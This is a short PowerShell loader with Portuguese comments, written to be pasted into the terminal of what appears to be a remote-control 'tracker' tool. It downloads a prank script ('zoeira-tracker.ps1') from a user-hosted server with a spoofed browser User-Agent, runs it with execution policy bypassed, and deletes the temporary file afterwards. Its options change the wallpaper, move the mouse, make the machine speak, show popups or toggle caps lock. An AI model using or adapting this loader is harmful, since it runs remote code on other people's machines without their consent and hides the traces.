# ==========================================================
#  COLE ISSO NO "Terminal PowerShell" DO TRACKER E ENVIE
#  (baixa o script hospedado, roda, e apaga o arquivo temporario)
# ==========================================================

# --- escolha aqui ---
$OPCAO = "2"     # 1=wallpaper  2=mouse  3=fala  4=popup  5=capslock  R=restaurar
$LINK  = ""      # SO para a opcao 1: link publico DIRETO da imagem (termina em .jpg/.png)

# --- onde voce hospedou o zoeira-tracker.ps1 ---
$URL = "https://SEU-SERVIDOR.com.br/zoeira-tracker.ps1"

# --- nao precisa mexer daqui pra baixo ---
$f = Join-Path $env:TEMP "z.ps1"
try {
    $ProgressPreference = 'SilentlyContinue'
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $URL -OutFile $f -UseBasicParsing -Headers @{ 'User-Agent' = 'Mozilla/5.0' }

    $args = @('-NoProfile','-ExecutionPolicy','Bypass','-File',$f,'-OPCAO',$OPCAO)
    if ($LINK) { $args += @('-LINK',$LINK) }
    & powershell.exe @args
}
finally {
    Remove-Item $f -Force -ErrorAction SilentlyContinue
}
